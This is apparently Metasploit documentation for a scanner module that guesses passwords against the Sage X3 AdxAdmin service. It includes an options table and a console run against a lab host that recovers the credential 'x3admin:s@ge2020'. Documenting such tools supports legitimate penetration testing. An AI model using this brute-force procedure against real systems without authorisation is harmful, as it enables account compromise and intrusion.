## Vulnerable Application

### Description

This module allows an attacker to perform a password guessing attack against
the Sage X3 `AdxAdmin` service, which in turn can be used to authenticate to
a local Windows account.

This module implements the `X3Crypt` function to 'encrypt' any passwords to
be used during the authentication process, given a plaintext password.

### Setup

Not available.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Scenarios

### Sage X3 on Windows Server 2016

```
msf6 > use auxiliary/scanner/sage/x3_adxsrv_login
msf6 auxiliary(scanner/sage/x3_adxsrv_login) > options

Module options (auxiliary/scanner/sage/x3_adxsrv_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD          s@ge2020         no        Plaintext password with which to authenticate
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             1818             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME          x3admin          no        User with which to authenticate to the AdxAdmin service
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/sage/x3_adxsrv_login) > set rhosts 172.16.57.6
rhosts => 172.16.57.6
msf6 auxiliary(scanner/sage/x3_adxsrv_login) > set rport 50000
rport => 50000
msf6 auxiliary(scanner/sage/x3_adxsrv_login) > run

[+] 172.16.57.6:50000 - 172.16.57.6:50000 - Success: 'x3admin:s@ge2020'
[*] 172.16.57.6:50000 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/sage/x3_adxsrv_login) >
```
